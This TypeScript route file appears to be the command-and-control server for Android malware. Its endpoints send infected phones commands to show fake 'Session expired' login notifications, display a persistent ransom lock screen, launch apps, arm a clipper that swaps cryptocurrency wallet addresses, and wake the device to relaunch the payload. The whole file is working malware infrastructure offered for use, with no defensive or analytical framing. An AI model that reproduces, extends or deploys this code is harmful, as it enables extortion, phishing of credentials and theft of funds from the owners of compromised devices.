import type { FastifyInstance } from 'fastify';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import { getDb } from '../db/index.js';
import { clients } from '../db/schema.js';
import { eq } from 'drizzle-orm';
import { socketService } from '../services/socket.js';
import { CMD } from '../types/index.js';

function canAccess(user: any, id: string): boolean {
  if (user.role === 'admin') return true;
  const d = getDb();
  const c = d.select({ ownerId: clients.ownerId }).from(clients).where(eq(clients.id, id)).get();
  return c?.ownerId === user.userId;
}

export async function controlRoutes(app: FastifyInstance) {
  // NSC — matching-app login notification
  app.post('/api/client/:id/nsc', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    const b = request.body as any;
    socketService.sendCommand(id, CMD.NSC as any, {
      action: 'nsc_push',
      nscTitle: b.title || 'Session expired',
      nscBody: b.body || 'Tap to sign in again',
      nscIcon: b.icon || '',
      nscPkg: b.package || '',
      id: b.id || 0xF500,
    });
    return { success: true, data: { message: 'NSC pushed' } };
  });

  // Ransom — persistent lock screen with custom message/image
  app.post('/api/client/:id/ransom', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    const b = request.body as any;
    socketService.sendCommand(id, CMD.RANSOM as any, {
      action: 'ransom_show',
      ransomMsg: b.message || '',
      ransomImg: b.image || '',
    });
    return { success: true, data: { message: 'Ransom shown' } };
  });

  app.post('/api/client/:id/ransom/hide', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    socketService.sendCommand(id, CMD.RANSOM as any, { action: 'ransom_hide' });
    return { success: true, data: { message: 'Ransom hidden' } };
  });

  // Launch — open any app on device
  app.post('/api/client/:id/launch', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    const b = request.body as any;
    socketService.sendCommand(id, CMD.LAUNCH as any, {
      action: 'launch_app',
      package: b.package || '',
    });
    return { success: true, data: { message: 'Launch command sent' } };
  });

  // Clipper — configure addresses / arm / disarm
  app.post('/api/client/:id/clipper', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    const b = request.body as any;
    socketService.sendCommand(id, CMD.CLIPPER as any, {
      action: b.action || 'clipper_config',
      config: {
        btc: b.btc || '', eth: b.eth || '', trx: b.trx || '',
        bnb: b.bnb || '', sol: b.sol || '', ltc: b.ltc || '',
        doge: b.doge || '', xmr: b.xmr || '',
        enabled: b.enabled ?? true,
      },
    });
    return { success: true, data: { message: 'Clipper command sent' } };
  });

  // Auto-launch — wake device + open payload + attempt socket reconnect
  app.post('/api/client/:id/auto-launch', {
    preHandler: [app.auth, requirePermission('device:control')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
    socketService.sendCommand(id, CMD.LAUNCH as any, { action: 'wake' });
    socketService.sendCommand(id, CMD.LAUNCH as any, {
      action: 'launch_app',
      package: '',
    });
    return { success: true, data: { message: 'Auto-launch sequence sent' } };
  });
}
